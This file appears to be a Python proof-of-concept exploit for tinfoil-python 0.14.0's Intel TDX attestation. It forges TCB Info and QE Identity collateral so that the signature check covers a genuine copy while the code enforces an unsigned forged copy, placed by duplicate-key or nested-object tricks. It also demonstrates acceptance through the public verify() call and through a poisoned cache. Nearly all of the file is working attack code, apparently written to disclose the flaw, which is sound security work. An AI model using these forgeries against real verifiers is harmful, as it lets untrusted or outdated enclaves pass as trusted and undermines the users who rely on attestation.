"""
Minimal PoC: tinfoil-python 0.14.0 verifies Intel's signature over one copy of
the TDX collateral object and enforces a different, unsigned copy.

Two triggers, both against the unmodified published wheel:
  dup-key : {"tcbInfo": <GENUINE>, "signature": <SIG>, "tcbInfo": <FORGED>}
  nested  : {"_": {"tcbInfo": <GENUINE>}, "tcbInfo": <FORGED>, "signature": <SIG>}
            (no duplicate member anywhere, so a strict object_pairs_hook parser
            does not stop it)

Inputs: Intel's production SPR quote and the genuine Intel-signed 2023 PCS
artifacts shipped as google/go-tdx-guest v0.3.1 testdata.
Knobs (none touches collateral logic):
  * clock frozen to 2023-06-30 (validity window of the 2023 collateral);
  * requests.get replaced by a local stand-in for https://tdx-proxy.tinfoil.sh
    (the attacker's position); it refuses any other URL;
  * private empty collateral cache directory;
  * stages 1-5 call validate_collateral() (Step 5 of verify_tdx_attestation)
    with min_tcb_evaluation_data_number=15, because the 2023 genuine data has
    evaluation number 15 and the shipped floor of 19 would reject it as stale
    before the TCB-level decision we want to show;
  * stage 6 calls the public Document.verify() with the shipped floor (19); only
    the MR_SEAM / TD_ATTRIBUTES / XFAM / minimum TEE_TCB_SVN policy pins are set
    to the 2023 sample quote's values.

Usage: python -I poc_f2.py <data_dir>
"""
import base64
import copy
import dataclasses
import datetime as _dt
import gzip
import json
import os
import sys
import tempfile
from unittest import mock

import requests
from cryptography import x509
from cryptography.hazmat.primitives import serialization

import tinfoil
import tinfoil.attestation.cert_utils as cu
import tinfoil.attestation.collateral_tdx as ct
import tinfoil.attestation.attestation_tdx as at
from tinfoil.attestation.attestation import Document
from tinfoil.attestation.types import PredicateType
from tinfoil.attestation.abi_tdx import parse_quote
from tinfoil.attestation.verify_tdx import verify_tdx_quote

DATA = sys.argv[1]
FROZEN = _dt.datetime(2023, 6, 30, tzinfo=_dt.timezone.utc)


class FrozenDateTime(_dt.datetime):
    @classmethod
    def now(cls, tz=None):
        return FROZEN.astimezone(tz) if tz else FROZEN.replace(tzinfo=None)


cu.datetime = FrozenDateTime
ct.datetime = FrozenDateTime


def rd(name, mode="rb"):
    with open(os.path.join(DATA, name), mode) as f:
        return f.read()


RAW_QUOTE = rd("quote.dat")
GENUINE_TCB = rd("tcb_info.json").rstrip()
GENUINE_QE = rd("qe_identity.json").rstrip()
TCB_CHAIN = rd("tcbInfoIssuerChain.txt", "r").strip()
QE_CHAIN = rd("qeIdentityIssuerChain.txt", "r").strip()
PCKCRL_CHAIN = rd("pckCrlIssuerChain.txt", "r").strip()
PCK_CRL_PEM = x509.load_der_x509_crl(rd("pckcrl.der")).public_bytes(serialization.Encoding.PEM)
ROOT_CRL_DER = rd("rootcrl.der")


# ---------------------------------------------------------------- forgeries
def dup_key(genuine: bytes, key: str, forged: dict) -> bytes:
    """Append a second top-level member with the same name (json.loads: last wins)."""
    return genuine[:-1] + b',"' + key.encode() + b'":' + json.dumps(forged, separators=(",", ":")).encode() + b"}"


def nested(genuine: bytes, key: str, forged: dict) -> bytes:
    """Park the genuine signed object under a decoy member; no duplicate names."""
    text = genuine.decode()
    start = text.find(f'"{key}":') + len(key) + 3
    _, end = json.JSONDecoder().raw_decode(text, start)
    inner = text[start:end]
    sig = json.loads(genuine)["signature"]
    forged_s = json.dumps(forged, separators=(",", ":"))
    return f'{{"_":{{"{key}":{inner}}},"{key}":{forged_s},"signature":"{sig}"}}'.encode()


zero16 = [{"svn": 0} for _ in range(16)]
FORGED_TCB = copy.deepcopy(json.loads(GENUINE_TCB)["tcbInfo"])
FORGED_TCB.update(
    tcbEvaluationDataNumber=99, nextUpdate="2099-01-01T00:00:00Z",
    tcbLevels=[{"tcb": {"sgxtcbcomponents": zero16, "pcesvn": 0, "tdxtcbcomponents": zero16},
                "tcbDate": "2023-02-15T00:00:00Z", "tcbStatus": "UpToDate"}],
    tdxModuleIdentities=[{"id": "TDX_00", "mrsigner": "00" * 48, "attributes": "0000000000000000",
                          "attributesMask": "FFFFFFFFFFFFFFFF",
                          "tcbLevels": [{"tcb": {"isvsvn": 0}, "tcbDate": "2023-02-15T00:00:00Z",
                                         "tcbStatus": "UpToDate"}]}])
FORGED_QE = copy.deepcopy(json.loads(GENUINE_QE)["enclaveIdentity"])
FORGED_QE.update(tcbEvaluationDataNumber=99, nextUpdate="2099-01-01T00:00:00Z")
FORGED_QE_SIGNER = dict(FORGED_QE, mrsigner="41" * 32)  # what a custom ("fake") QE would need


def strict_loads(s, *a, **kw):
    """Stand-in for the obvious fix: json.loads that rejects duplicate members."""
    def hook(pairs):
        names = [k for k, _ in pairs]
        if len(names) != len(set(names)):
            raise ct.CollateralError(f"duplicate JSON member rejected: {names}")
        return dict(pairs)
    kw["object_pairs_hook"] = hook
    return _ORIG_LOADS(s, *a, **kw)


_ORIG_LOADS = json.loads


# ------------------------------------------- stand-in for tdx-proxy.tinfoil.sh
def proxy(tcb_body, qe_body):
    def get(url, timeout=None, **kw):
        if not url.startswith("https://tdx-proxy.tinfoil.sh/"):
            raise AssertionError(f"unexpected host: {url}")
        r = requests.Response(); r.status_code = 200; r.url = url
        if "/tdx/certification/v4/tcb?" in url:
            r._content = tcb_body; r.headers["TCB-Info-Issuer-Chain"] = TCB_CHAIN
        elif "/tdx/certification/v4/qe/identity" in url:
            r._content = qe_body; r.headers["SGX-Enclave-Identity-Issuer-Chain"] = QE_CHAIN
        elif "/sgx/certification/v4/pckcrl?ca=platform" in url:
            r._content = PCK_CRL_PEM; r.headers["SGX-PCK-CRL-Issuer-Chain"] = PCKCRL_CHAIN
        elif url.endswith("/IntelSGXRootCA.der"):
            r._content = ROOT_CRL_DER
        else:
            raise AssertionError(f"unexpected URL {url}")
        return r
    return get


def no_network(*a, **k):
    raise AssertionError("network used")


QUOTE = parse_quote(RAW_QUOTE)
PCK_CHAIN = verify_tdx_quote(QUOTE, RAW_QUOTE)  # real PCK chain -> pinned Intel SGX Root CA


def collateral_decision(label, tcb_body, qe_body, strict=False):
    with tempfile.TemporaryDirectory() as d:
        ps = [mock.patch.object(ct, "_TDX_CACHE_DIR", d), mock.patch.object(ct.requests, "get", proxy(tcb_body, qe_body))]
        if strict:
            ps.append(mock.patch.object(ct.json, "loads", strict_loads))
        for p in ps:
            p.start()
        try:
            res = ct.validate_collateral(QUOTE, PCK_CHAIN, min_tcb_evaluation_data_number=15)
            out = f"ACCEPT  TCB status={res.tcb_level.tcb_status.value}"
        except ct.CollateralError as e:
            full = str(e)
            out = f"REJECT  {full[:150]}"
            if "expected " + "41" * 32 in full:
                out = "REJECT(forged mrsigner enforced)  " + full.replace("41" * 32, "4141..(unsigned value)")
        finally:
            for p in reversed(ps):
                p.stop()
    print(f"{label:<62} -> {out}")
    return out.split("  ")[0]


def main():
    print("tinfoil", tinfoil.__version__ if hasattr(tinfoil, "__version__") else "", tinfoil.__file__)
    print("real quote verified (PCK chain, quote and QE report signatures) against the pinned Intel root;",
          "QE MRSIGNER =", QUOTE.signed_data.certification_data.qe_report_data.qe_report_parsed.mr_signer.hex()[:16] + "...")
    r = {}
    print("\n-- validate_collateral() on the real quote")
    r["1 genuine"] = collateral_decision("[1] genuine Intel TCB Info + QE Identity", GENUINE_TCB, GENUINE_QE)
    r["2 dupkey"] = collateral_decision("[2] dup-key tcbInfo forgery", dup_key(GENUINE_TCB, "tcbInfo", FORGED_TCB), GENUINE_QE)
    r["3 nested"] = collateral_decision("[3] nested tcbInfo forgery", nested(GENUINE_TCB, "tcbInfo", FORGED_TCB), GENUINE_QE)
    r["4a qe-dupkey"] = collateral_decision(
        "[4a] [2] + dup-key enclaveIdentity, mrsigner=4141..",
        dup_key(GENUINE_TCB, "tcbInfo", FORGED_TCB), dup_key(GENUINE_QE, "enclaveIdentity", FORGED_QE_SIGNER))
    r["4b qe-nested"] = collateral_decision(
        "[4b] [3] + nested enclaveIdentity, mrsigner=4141..",
        nested(GENUINE_TCB, "tcbInfo", FORGED_TCB), nested(GENUINE_QE, "enclaveIdentity", FORGED_QE_SIGNER))
    print("     (4a/4b: the MRSIGNER check compares the real QE against the forged, unsigned value)")
    print("\n-- same, with a duplicate-rejecting json.loads patched in (the 'obvious' fix)")
    r["5a strict dupkey"] = collateral_decision("[5a] dup-key tcbInfo forgery, strict parser",
                                                dup_key(GENUINE_TCB, "tcbInfo", FORGED_TCB), GENUINE_QE, strict=True)
    r["5b strict nested"] = collateral_decision("[5b] nested tcbInfo forgery, strict parser",
                                                nested(GENUINE_TCB, "tcbInfo", FORGED_TCB), GENUINE_QE, strict=True)

    print("\n-- public entry point Document(TDX_GUEST_V2).verify(), shipped evaluation-number floor 19")
    b = QUOTE.td_quote_body
    cfg = dataclasses.replace(at.TdxVerificationConfig(), accepted_mr_seams=(b.mr_seam,),
                              expected_td_attributes=b.td_attributes, expected_xfam=b.xfam,
                              expected_minimum_tee_tcb_svn=b.tee_tcb_svn)
    assert cfg.min_tcb_evaluation_data_number == 19
    doc = Document(format=PredicateType.TDX_GUEST_V2, body=base64.b64encode(gzip.compress(RAW_QUOTE)).decode())
    with tempfile.TemporaryDirectory() as d:
        for label, getter in [("[6a] nested forgery of both objects",
                               proxy(nested(GENUINE_TCB, "tcbInfo", FORGED_TCB), nested(GENUINE_QE, "enclaveIdentity", FORGED_QE))),
                              ("[6b] next session, no network (poisoned cache)", no_network)]:
            with mock.patch.object(ct, "_TDX_CACHE_DIR", d), mock.patch.object(ct.requests, "get", getter), \
                    mock.patch.object(at, "_DEFAULT_CONFIG", cfg):
                try:
                    v = doc.verify()
                    out = f"ACCEPT  tls_fp={v.public_key_fp[:16]}.."
                except Exception as e:  # noqa: BLE001
                    out = f"REJECT  {str(e)[:150]}"
            print(f"{label:<62} -> {out}")
            r[label[:4]] = out.split()[0]

    expected = {"1 genuine": "REJECT", "2 dupkey": "ACCEPT", "3 nested": "ACCEPT", "4a qe-dupkey": "REJECT(forged mrsigner enforced)",
                "4b qe-nested": "REJECT(forged mrsigner enforced)", "5a strict dupkey": "REJECT", "5b strict nested": "ACCEPT",
                "[6a]": "ACCEPT", "[6b]": "ACCEPT"}
    print("\nRESULT:", r)
    ok = r == expected
    print("matches expected:", ok)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
